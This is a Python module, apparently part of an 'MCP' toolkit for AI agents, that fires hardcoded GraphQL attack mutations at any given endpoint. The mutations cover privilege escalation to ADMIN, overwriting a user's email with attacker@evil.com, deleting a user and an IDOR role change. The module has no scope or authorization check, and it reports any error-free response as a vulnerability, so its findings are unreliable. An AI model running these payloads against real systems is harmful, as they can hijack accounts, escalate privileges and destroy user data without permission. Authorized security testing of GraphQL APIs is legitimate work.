"""StealthVision-MCP - GraphQL Mutation Testing Module"""
import httpx
import json
import logging
from mcp_instance import mcp

logger = logging.getLogger("stealthvision")
from config import USER_AGENT, DEFAULT_TIMEOUT

GRAPHQL_MUTATION_PAYLOADS = {
    "privilege_escalation": [
        {"query": "mutation { updateRole(userId: 1, role: \"ADMIN\") { success } }"},
        {"query": "mutation { changePermission(permission: \"WRITE\", value: true) { ok } }"},
    ],
    "data_modification": [
        {"query": "mutation { updateUser(id: 1, email: \"attacker@evil.com\") { success } }"},
        {"query": "mutation { deleteUser(id: 1) { success } }"},
    ],
    "idor": [
        {"query": "mutation { updateProfile(userId: 1, data: {level: \"admin\"}) { user { id role } } }"},
    ],
}

@mcp.tool()
def graphql_mutation_test(endpoint: str, introspection: bool = True) -> dict:
    """Test GraphQL mutations for privilege escalation and data manipulation."""
    try:
        client = httpx.Client(timeout=DEFAULT_TIMEOUT, headers={"User-Agent": USER_AGENT}, follow_redirects=True)
        
        # First introspection
        query = {"query": "{ __schema { types { name } } }"}
        r = client.post(endpoint, json=query)
        
        if r.status_code != 200:
            return {"error": "Endpoint not accessible", "success": False}
        
        vulnerabilities = []
        
        for vuln_type, payloads in GRAPHQL_MUTATION_PAYLOADS.items():
            for payload in payloads:
                r = client.post(endpoint, json=payload)
                if r.status_code == 200:
                    try:
                        result = r.json()
                        if "errors" not in result:
                            vulnerabilities.append({
                                "type": vuln_type,
                                "payload": payload,
                                "response": str(result)[:100]
                            })
                    except Exception:
                        pass
        
        return {"vulnerabilities": vulnerabilities, "count": len(vulnerabilities), "success": True}
    except Exception as e:
        return {"error": str(e), "success": False}